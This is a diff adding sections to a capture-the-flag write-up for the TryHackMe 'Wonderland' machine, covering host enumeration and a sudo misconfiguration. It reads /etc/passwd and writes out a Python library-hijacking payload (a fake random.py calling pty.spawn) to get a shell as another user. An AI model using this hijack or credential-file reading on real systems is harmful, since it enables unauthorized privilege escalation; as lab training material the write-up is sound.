@@ -12,6 +12,8 @@ Completed on ??/??/20??
       - [Nmap Scan](#nmap-scan)
       - [Nikto Scan](#nikto-scan)
       - [Directory Fuzzing](#directory-fuzzing)
+      - [Exploring Wonderland](#exploring-wonderland)
+      - [Sudoers](#sudoers)
     - [Exploitation](#exploitation)
     - [Post Exploitation](#post-exploitation)
 <!-- /TOC -->
@@ -112,7 +114,82 @@ $ ssh alice@$IP
 Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
 alice@wonderland:~$
 ```
+#### Exploring Wonderland
+Executed some commands to gather info about the machine
+```bash
+$ uname -a
+Linux wonderland 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+```
+(Not that old linux kernel version)
+```bash
+$ sudo --version
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
 
+$ cat /etc/*release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=18.04
+```
+(Same for the Ubuntu version)
+```bash
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
+alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
+hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
+rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
+
+$ ls /home
+alice  hatter  rabbit  tryhackme
+```
+
+#### Sudoers 
+One thing I always check when I get access to a new machine, is the command "sudo -l" since its really easy for the admin to mess up with it and allow us to get access to things we shouldn't. Lucky for me this was the case.
+```bash
+$ sudo -l
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+```
+So it says we are allowed to execute with python the readonly file "walrus_and_the_carpenter.py" (code below) as user "rabbit".
+```python3
+import random
+poem = """The sun was shining on the sea,
+Shining with all his might:
+He did his very best to make
+The billows smooth and bright —
+And this was odd, because it was
+The middle of the night.
+
+...
+"""
+
+for i in range(10):
+    line = random.choice(poem.split("\n"))
+    print("The line was:\t", line)
+```
+Is it possible for us to mess up with the execution of this script? Well, one thing we can notice is that the path to import the random library is not specified. So if we were to create the file "random.py" and execute the script from the same directory, python would prioritize this file over the "random.py" in the PYTHONPATH. We created random.py in a way that when called, would spawn for us a shell.
+```python3
+import pty
+def choice(idontcare):
+    pty.spawn("sh")
+    exit()
+```
+Now we execute 
+```bash
+$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+```
+and we got ourselves a shell as the user "rabbit"!
+```
+$ whoami
+rabbit
+```
 ---
 ### Exploitation
 ---
